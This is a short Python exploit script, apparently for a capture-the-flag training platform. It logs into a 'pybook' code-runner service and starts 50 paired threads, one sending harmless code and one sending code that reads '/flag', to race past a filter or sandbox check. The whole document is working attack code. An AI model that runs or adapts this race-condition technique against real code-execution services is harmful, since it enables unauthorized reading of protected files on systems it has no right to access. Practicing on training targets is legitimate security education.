import requests
from threading import Thread
import time

def registration(u,p):
    url = "http://meta.training.jinblack.it/register.php"
    r = requests.post(url, data={"username":u,"password_1":p,"password_2":p,"reg_user":""})
    #print(r.text)
def login(u,p):
    url = "http://pybook.training.jinblack.it/login"
    r = requests.post(url, data={"username":u,"password":p})

    return {"Cookie":r.headers.get("Set-Cookie").split(";")[0]}

def runcode(code, cookie):
    url = "http://pybook.training.jinblack.it/run"
    q = requests.post(url, data=code, headers=cookie)
    print(q.text)

goodcode = "print('---')"

badcode = "print(open('/flag', 'r').read())"

i = 0
cookie = login("lollocrispy","lollocrispy")
while i < 50:
    i = i +1
    t1 = Thread(target=runcode, args=[goodcode,cookie])
    t2 = Thread(target=runcode, args=[badcode,cookie])

    t1.start()
    t2.start()

    time.sleep(0.01)
    